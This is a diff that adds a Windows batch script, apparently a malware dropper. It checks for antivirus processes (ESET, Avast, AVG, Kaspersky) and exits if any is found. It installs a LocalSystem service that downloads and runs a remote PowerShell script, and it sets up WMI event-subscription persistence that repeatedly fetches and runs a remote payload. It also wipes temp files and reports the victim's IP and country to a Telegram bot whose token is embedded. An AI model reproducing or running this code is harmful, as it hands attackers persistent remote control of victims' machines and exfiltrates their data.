@@ -1,0 +1,42 @@
+setlocal EnableDelayedExpansion
+if exist "%ProgramData%\logdata..\Index.exe" (
+    exit /b
+)
+
+setlocal EnableDelayedExpansion
+set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe"
+
+for %a in (%processList%) do (
+    tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
+    if not errorlevel 1 (
+        exit /b
+    )
+)
+
+sc create Help binPath="cmd.exe /c powershell.exe irm https://raw.githubusercontent.com/pushop/0/0/p/run.ps1 ^| iex" start="auto" obj="LocalSystem"
+
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="CSM", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 2400 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="CSM", CommandLineTemplate="cmd.exe /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/p/push | cmd /Q /V:ON"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"CSM\"", Consumer="CommandLineEventConsumer.Name=\"CSM\""
+
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='CSM'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 2400 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='CSM'; CommandLineTemplate='cmd.exe /c curl.exe -s https://raw.githubusercontent.com/pushop/0/0/p/push | cmd /Q /V:ON'} | Out-Null"
+powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"CSM\"'; Consumer='CommandLineEventConsumer.Name=\"CSM\"'} | Out-Null"
+
+del /S /Q "%USERPROFILE%\AppData\Local\Temp\*.*"
+
+if exist "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}" exit /b
+chcp 65001 >nul
+set "TOKEN=7324905630:AAGfvsuH0MnwXbqNvvQQlpGMwejdPOJ69g0"
+set "CHAT_ID=-4955395962"
+set "IP=No IP"
+set "Country=No Country"
+
+for /f "tokens=1,2 delims=," %a in ('%WINDIR%\System32\curl.exe -s "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
+    if not "%a"=="" set "Country=%a"
+    if not "%b"=="" set "IP=%b"
+)
+
+%WINDIR%\System32\curl.exe -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=RUP%0AIP: %IP%%0ACountry: %Country%" 1>nul 2>nul
+mkdir "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}"
+endlocal
